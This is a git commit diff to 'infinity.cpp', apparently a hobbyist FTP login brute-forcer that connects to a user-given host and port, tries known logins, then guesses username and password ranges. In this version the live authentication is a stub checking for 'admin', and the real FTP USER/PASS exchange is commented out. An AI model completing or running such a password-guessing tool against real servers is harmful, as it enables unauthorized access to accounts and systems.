ffc6d7895dfda0f588aef299cee6a89b7ee833c7
Bharatvaj PH <bharatvaj@yahoo.com>
2017-08-28 12:53:12 +0530

    Normalized Output

--- infinity.cpp
+++ infinity.cpp
@@ -7,7 +7,7 @@
 #include<signal.h>
 #include <curl/curl.h>
 
-//#define ENABLE_LOG
+#define ENABLE_LOG
 #include "clog.h"
 #include "network_utils.h"
 #include "init.h"
@@ -21,10 +21,41 @@ void print(string str, int servfd){
     write(servfd, str.c_str(), str.size());
 }
 
-string scan(int servfd){
-    string buf;
-    read(servfd, &buf[0], buf.size());
+/*
+char *scan(int servfd){
+    char *buf = (char *)malloc(50);
+    int bytes_received = 0;
+    while((bytes_received = read(servfd, buf, 1)) != 0){
+      cout << buf << endl;
+    }
     return buf;
+}
+*/
+
+char *scan(int servfd){
+  char *buffer = (char *)malloc(256);
+memset(buffer, 0, 256);
+char *pBuf = buffer;
+int bytesLeft = 256 - sizeof(char);
+
+while(bytesLeft > 0)
+{
+    int n = read(servfd, pBuf, bytesLeft);
+    if (n < 0)
+    {
+        cout << "ERROR reading from socket" << endl;
+        break;
+    }
+    if(n == 0)
+    {
+        cout << "peer shutted down" << endl;
+        break;
+    }
+    pBuf += n;
+    bytesLeft -= n;
+}
+cout << buffer << endl;
+return buffer;
 }
 
 bool checkCode(const char *msg, const char *code){
@@ -35,34 +66,37 @@ bool checkCode(const char *msg, const char *code){
     return false;
 }
 
+int auth_cnt = 0;
 /*
 bool authenticate(int servfd, string user, string pass){
+    auth_cnt++;
     log_inf(F_CRY, "submitting username");
+    scan(servfd);
     print("user " + user, servfd);
-    
-    if(!checkCode(scan(servfd).c_str(), "331")){
+
+    if(!checkCode(scan(servfd), "331")){
         log_err(F_CRY, "protocol mismatch");
         return false;
     }
     log_inf(F_CRY, "submitting password");
     print("pass " + pass, servfd);
-    
-    if(!checkCode(scan(servfd).c_str(), "230")){
+
+    if(!checkCode(scan(servfd), "230")){
         log_err(F_CRY, "credentials failed");
         return false;
     }
     log_inf(F_CRY, "credentials accepted");
     return true;
 }
- */
+*/
 
-int auth_cnt = 0;
 bool authenticate(int servfd, string user, string pass){
+
+    auth_cnt++;
     if(pass == "admin"){
         cout << "password found: " << pass << " | tries: "<< auth_cnt << endl;
         return true;
     }
-    auth_cnt++;
     return false;
 }
 
@@ -129,32 +163,41 @@ int bruteforceLogin(int servfd, int user_range[2], int pass_range[2]){
     return -1;
 }
 
-#define RHOST "192.168.1.1"
-#define RPORT 21
-
 void exit_handler(int sig){
+    cout << "tries: " << auth_cnt << endl;
     cout << endl << "saving results for later use..." << endl;
     exit(sig);
 }
 
 int main(int argc, char *argv[]){
-    init();
+	int RPORT = 21;
+	string RHOST = "localhost";
+  //TODO add custom port switch -p and protocol switch -P
+  if(argc != 3){
+    cout << "Uage: infinity <host> <port>" << endl;
+    return -1;
+  }
+
+  RHOST = argv[1];
+  RPORT = atoi(argv[2]);
+
+init();
     signal(SIGINT, exit_handler);
-    
+
     int servfd = -1;
-    if((servfd = connect_server(RHOST, RPORT)) < 0 ){
+    if((servfd = connect_server(RHOST.c_str(), RPORT)) < 0 ){
         print("Cannot connect to the server");
         return -1;
     }
     cout << "Connected to the server: " << RHOST << endl;
-    
+
     print("guessing logins");
     if(tryKnown(servfd) == 0){
         print("guessed login correctly");
         return 0;
     }
     print("cannot guess login");
-    
+
     int user_range[] = {MIN_USER_CHARS, MAX_USER_CHARS};
     int pass_range[] = {MIN_PASS_CHARS, MAX_USER_CHARS};
     print("Bruteforcing login with default settings...this may take some time [~days]");
